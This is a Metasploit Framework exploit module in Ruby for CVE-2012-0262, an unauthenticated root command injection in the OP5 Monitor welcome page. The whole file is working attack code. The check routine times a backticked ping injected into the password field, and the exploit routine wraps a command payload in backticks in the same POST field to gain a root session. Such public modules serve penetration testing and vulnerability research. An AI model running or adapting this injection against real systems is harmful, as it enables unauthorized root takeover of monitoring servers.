##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'OP5 welcome Remote Command Execution',
      'Description' => %q{
        This module exploits an arbitrary root command execution vulnerability in
        OP5 Monitor welcome. Ekelow AB has confirmed that OP5 Monitor versions 5.3.5,
        5.4.0, 5.4.2, 5.5.0, 5.5.1 are vulnerable.
      },
      'Author'     => [ 'Peter Osterberg <j[at]vel.nu>' ],
      'License'    => MSF_LICENSE,
      'References' =>
        [
          ['CVE', '2012-0262'],
          ['OSVDB', '78065'],
          ['URL', 'http://www.ekelow.se/file_uploads/Advisories/ekelow-aid-2012-01.pdf'],
          ['URL', 'http://www.op5.com/news/support-news/fixed-vulnerabilities-op5-monitor-op5-appliance/'],
          ['URL', 'http://secunia.com/advisories/47417/'],
        ],
      'Privileged' => true,
      'Payload'    =>
        {
          'DisableNops' => true,
          'Space'       => 1024,
          'BadChars'    => '`\\|',
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'perl ruby',
            }
        },
      'Platform'       => [ 'unix', 'linux' ],
      'Arch'           => ARCH_CMD,
      'Targets'        => [[ 'Automatic', { }]],
      'DisclosureDate' => 'Jan 05 2012',
      'DefaultTarget'  => 0))

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('URI', [true, "The full URI path to /op5config/welcome", "/op5config/welcome"]),
      ], self.class)
  end

  def check
    print_status("Attempting to detect if the OP5 Monitor is vulnerable...")
    print_status("Sending request to https://#{rhost}:#{rport}#{datastore['URI']}")

    # Try running/timing 'ping localhost' to determine is system is vulnerable
    start = Time.now

    data = 'do=do=Login&password=`ping -c 10 127.0.0.1`';
    res = send_request_cgi({
      'uri'     => datastore['URI'],
      'method'  => 'POST',
      'proto'   => 'HTTPS',
      'data'    => data,
      'headers' =>
      {
        'Connection'     => 'close',
      }
    }, 25)
    elapsed = Time.now - start
    if elapsed >= 5
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end

  def exploit
    print_status("Sending request to https://#{rhost}:#{rport}#{datastore['URI']}")

    data = 'do=do=Login&password=`' + payload.encoded + '`';

    res = send_request_cgi({
      'uri'     => datastore['URI'],
      'method'  => 'POST',
      'proto'   => 'HTTPS',
      'data'    => data,
      'headers' =>
      {
        'Connection'     => 'close',
      }
    }, 10)

    if(not res)
      if session_created?
        print_status("Session created, enjoy!")
      else
        print_error("No response from the server")
      end
      return
    end
  end
end
